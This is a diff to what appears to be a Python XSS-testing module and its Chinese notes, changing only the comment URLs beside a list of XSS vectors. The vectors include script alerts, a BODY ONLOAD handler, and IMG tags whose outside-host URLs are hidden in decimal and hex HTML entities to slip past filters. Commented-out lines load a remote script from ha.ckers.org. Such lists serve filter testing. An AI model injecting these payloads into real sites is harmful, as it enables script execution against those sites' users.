@@ -110,11 +110,11 @@ def fun(string):
 <SCRIPT>alert('XSS');</SCRIPT>
 由于IE7后不支持<IMG SRC="javascript:alert('XSS');">中脚本的执行，因此这种攻击方式不再有效，但SRC中的链接仍然会被执行。
 <IMG SRC=http://wedge.sinaapp.com/3>
-十进制html编码引用 http://wedge.sinaapp.com/s?k=$4
+十进制html编码引用 http://wedge.sinaapp.com/4
 <IMG SRC=&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#119;&#101;&#100;&#103;&#101;&#46;&#115;&#105;&#110;&#97;&#97;&#112;&#112;&#46;&#99;&#111;&#109;&#47;&#52;>
-结尾没有分号的十进制html编码引用 http://wedge.sinaapp.com/s?k=$5
+结尾没有分号的十进制html编码引用 http://wedge.sinaapp.com/5
 <IMG SRC=&#0000104&#0000116&#0000116&#0000112&#000058&#000047&#000047&#0000119&#0000101&#0000100&#0000103&#0000101&#000046&#0000115&#0000105&#0000110&#000097&#000097&#0000112&#0000112&#000046&#000099&#0000111&#0000109&#000047&#000053>
-结尾没有分号的十六进制html编码引用 http://wedge.sinaapp.com/s?k=$6
+结尾没有分号的十六进制html编码引用 http://wedge.sinaapp.com/6
 <IMG SRC=&#x68&#x74&#x74&#x70&#x3a&#x2f&#x2f&#x77&#x65&#x64&#x67&#x65&#x2e&#x73&#x69&#x6e&#x61&#x61&#x70&#x70&#x2e&#x63&#x6f&#x6d&#x2f&#x36>
 BODY标签实现XSS攻击
 <BODY ONLOAD=alert('XSS')>
@@ -130,11 +130,11 @@ xss_vectors = [
     '''<SCRIPT>alert('XSS');</SCRIPT>''',
     # ''''';!--"<XSS>=&{()}''',
     '''<IMG SRC=http://wedge.sinaapp.com/3>''',  # IE7后不支持 <IMG SRC="javascript:alert('XSS');">
-    # http://wedge.sinaapp.com/s?k=$4
+    # http://wedge.sinaapp.com/4
     '''<IMG SRC=&#104;&#116;&#116;&#112;&#58;&#47;&#47;&#119;&#101;&#100;&#103;&#101;&#46;&#115;&#105;&#110;&#97;&#97;&#112;&#112;&#46;&#99;&#111;&#109;&#47;&#52;>''',
-    # http://wedge.sinaapp.com/s?k=$5
+    # http://wedge.sinaapp.com/5
     '''<IMG SRC=&#0000104&#0000116&#0000116&#0000112&#000058&#000047&#000047&#0000119&#0000101&#0000100&#0000103&#0000101&#000046&#0000115&#0000105&#0000110&#000097&#000097&#0000112&#0000112&#000046&#000099&#0000111&#0000109&#000047&#000053>''',
-    # http://wedge.sinaapp.com/s?k=$6
+    # http://wedge.sinaapp.com/6
     '''<IMG SRC=&#x68&#x74&#x74&#x70&#x3a&#x2f&#x2f&#x77&#x65&#x64&#x67&#x65&#x2e&#x73&#x69&#x6e&#x61&#x61&#x70&#x70&#x2e&#x63&#x6f&#x6d&#x2f&#x36>''',
     # '''<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>''',
     # '''<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>''',
